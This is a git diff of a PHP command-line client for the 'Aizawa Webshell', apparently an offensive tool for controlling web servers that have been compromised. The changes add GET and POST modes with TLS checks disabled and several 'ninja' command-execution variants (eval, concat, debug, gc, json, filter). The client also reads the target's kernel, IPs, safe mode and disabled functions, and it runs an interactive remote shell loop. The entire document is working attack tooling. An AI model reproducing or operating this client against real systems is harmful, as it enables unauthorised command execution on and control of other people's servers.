@@ -66,6 +66,35 @@ function http_aizawa_ninja($url, $cmd)
 function execute($url, $cmd, $type)
 {
     switch ($type) {
+
+        case "get":
+            //
+            //  it's kinda weird that if you use curl to get the response code like the post method below
+            //  the $httpcode is working fine if you adding query delimiter (?) to the url
+            //  something like this:  $queryDelimiter = strpos($url, '?') !== false ? '&' : '?';
+            //  but alas, the result still the same, the $httpcode is working fine but the $result is not
+            //  but if you init a new curl like this, it's working fine
+            //  so i'm just gonna leave it like this
+            //  if you have any idea why this is happening, please let me know or just make a pull request
+            //
+            $ch = curl_init();
+            curl_setopt($ch, CURLOPT_URL, $url . $cmd);
+            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+            curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
+            curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
+            $result = curl_exec($ch);
+            $httpcode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
+            curl_close($ch);
+            return [$result, $httpcode];        
+
+        case "post":
+            $ch = curl($url);
+            curl_setopt($ch, CURLOPT_POST, 1);
+            curl_setopt($ch, CURLOPT_POSTFIELDS, $cmd);
+            $result = curl_exec($ch);
+            curl_close($ch);
+            return $result;
+
         case "http_user_agent_get":
             $result = http_user_agent_get($url . "?cmd=system", $cmd);
             switch (true) {
@@ -202,7 +231,7 @@ function execute($url, $cmd, $type)
             }            
             return $result;
 
-        case "http_aizawa_ninja":
+        case "http_aizawa_ninja_eval":
             $result = http_aizawa_ninja($url, "system~" . $cmd);
             switch (true) {
                 case empty($result):
@@ -226,21 +255,8 @@ function execute($url, $cmd, $type)
             }            
             return $result;
 
-        case "get":
-            $ch = curl($url . $cmd);
-
-            $result = curl_exec($ch);
-            $httpcode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
-            curl_close($ch);
-            return [$result, $httpcode];
-
-        case "post":
-            $ch = curl($url);
-            curl_setopt($ch, CURLOPT_POST, 1);
-            curl_setopt($ch, CURLOPT_POSTFIELDS, $cmd);
-
-            $result = curl_exec($ch);
-            curl_close($ch);
+        case "http_aizawa_ninja_concat" || "http_aizawa_ninja_debug" || "http_aizawa_ninja_gc" || "http_aizawa_ninja_json" || "http_aizawa_ninja_filter":
+            $result = http_aizawa_ninja($url, $cmd);
             return $result;
 
         default:
@@ -271,7 +287,12 @@ $hua = preg_match('/get_aizawa_hua_(.*)\./', $filename, $hua);
 $hal = preg_match('/get_aizawa_hal_(.*)\./', $filename, $hal);
 $hua1 = preg_match('/post_aizawa_hua_(.*)\./', $filename, $hua1);
 $hal1 = preg_match('/post_aizawa_hal_(.*)\./', $filename, $hal1);
-$ninja = preg_match('/aizawa_ninja_(.*)\./', $filename, $ninja);
+$ninja1 = preg_match('/aizawa_ninja_eval(.*)\./', $filename, $ninja1);
+$ninja2 = preg_match('/aizawa_ninja_concat(.*)\./', $filename, $ninja2);
+$ninja3 = preg_match('/aizawa_ninja_debug(.*)\./', $filename, $ninja3);
+$ninja4 = preg_match('/aizawa_ninja_gc(.*)\./', $filename, $ninja4);
+$ninja5 = preg_match('/aizawa_ninja_json(.*)\./', $filename, $ninja5);
+$ninja6 = preg_match('/aizawa_ninja_filter(.*)\./', $filename, $ninja6);
 switch (true) {
     case $hua:
         $type = "http_user_agent_get";
@@ -289,8 +310,28 @@ switch (true) {
         $type = "http_accept_language_post";
         break;
         
-    case $ninja:
-        $type = "http_aizawa_ninja";
+    case $ninja1:
+        $type = "http_aizawa_ninja_eval";
+        break;
+    
+    case $ninja2:
+        $type = "http_aizawa_ninja_concat";
+        break;
+
+    case $ninja3:
+        $type = "http_aizawa_ninja_debug";
+        break;
+
+    case $ninja4:
+        $type = "http_aizawa_ninja_gc";
+        break;
+
+    case $ninja5:
+        $type = "http_aizawa_ninja_json";
+        break;
+
+    case $ninja6:
+        $type = "http_aizawa_ninja_filter";
         break;
         
     default:
@@ -302,9 +343,9 @@ $user = preg_replace('/\s+/', '', (string) $user);
 $user = empty($user) ? "aizawaema" : ($user === "ERROR" ? "aizawaema" : $user);
 $hostname = execute($url, "hostname", $type);
 $hostname = preg_replace('/\s+/', '', (string) $hostname);
-$hostname = empty($user) ? "virtualesport" : ($user === "ERROR" ? "virtualesport" : $user);
+$hostname = empty($hostname) ? "virtualesport" : ($hostname === "ERROR" ? "virtualesport" : $hostname);
 switch (true) {
-    case $ninja:
+    case $ninja1 || $ninja2 || $ninja3 || $ninja4 || $ninja5 || $ninja6:
         print "\n$GLOBALS[green]Successfully connected to Aizawa Webshell Ninja Edition!$GLOBALS[clear]\n\n";
         break;
     default:
@@ -327,18 +368,17 @@ switch (true) {
                 $cip = execute($url, "?client_ip", "get")[0];
                 break;
         }
-        $disablefunc = $disablefunc == "NONE" ? $GLOBALS["green"] . $disablefunc . $GLOBALS["clear"] : $GLOBALS["red"] . $disablefunc . $GLOBALS["clear"];
-        $safemode = $safemode == "ON" ? $GLOBALS["red"] . $safemode . $GLOBALS["clear"] : $GLOBALS["green"] . $safemode . $GLOBALS["clear"];
+        $disablefunc = empty($disablefunc) ? $GLOBALS["red"] . "ERROR" . $GLOBALS["clear"] : ($disablefunc == "NONE" ? $GLOBALS["green"] . $disablefunc . $GLOBALS["clear"] : $GLOBALS["red"] . $disablefunc . $GLOBALS["clear"]);
+        $safemode = empty($safemode) ? $GLOBALS["red"] . "ERROR" . $GLOBALS["clear"] : ($safemode == "ON" ? $GLOBALS["red"] . $safemode . $GLOBALS["clear"] : $GLOBALS["green"] . $safemode . $GLOBALS["clear"]);
         $kernel = empty($kernel) ? $GLOBALS["red"] . "ERROR" . $GLOBALS["clear"] : $GLOBALS["green"] . $kernel . $GLOBALS["clear"];
         $server = empty($server) ? $GLOBALS["red"] . "ERROR" . $GLOBALS["clear"] : $GLOBALS["green"] . $server . $GLOBALS["clear"];
         $sip = empty($sip) ? $GLOBALS["red"] . "ERROR" . $GLOBALS["clear"] : $GLOBALS["green"] . $sip . $GLOBALS["clear"];
-        $cip = empty($cip) ? $GLOBALS["red"] . "ERROR" . $GLOBALS["clear"] : $GLOBALS["green"] . $cip . $GLOBALS["clear"];
+        $cip = empty($cip) ? $GLOBALS["red"] . "ERROR" . $GLOBALS["clear"] : $GLOBALS["green"] . $cip . $GLOBALS["clear"];        
         print "\nKernel       :  $kernel\nServer       :  $server\nSafe Mode    :  $safemode\nServer IP    :  $sip\nClient IP    :  $cip\nDisable Func :  $disablefunc\n\n";
     break;
 }
 do {
-    print $GLOBALS["yellow"] . $user . $GLOBALS["clear"] . "@" . $GLOBALS["blue"] . $hostname . $GLOBALS["clear"] . ":~" . $GLOBALS["bold"] . "$ " . $GLOBALS["clear"];
-    $cmd = trim((readline()));
+    $cmd = readline($GLOBALS["yellow"] . $user . $GLOBALS["clear"] . "@" . $GLOBALS["blue"] . $hostname . $GLOBALS["clear"] . ":~" . $GLOBALS["bold"] . "$ " . $GLOBALS["clear"]);
     readline_add_history($cmd);
     switch ($cmd) {
         case 'exit':
@@ -347,3 +387,4 @@ do {
             print "\n" . $GLOBALS["cyan"] . execute($url, $cmd, $type) . $GLOBALS["clear"] . "\n";
     }
 } while ($cmd != 'exit');
+
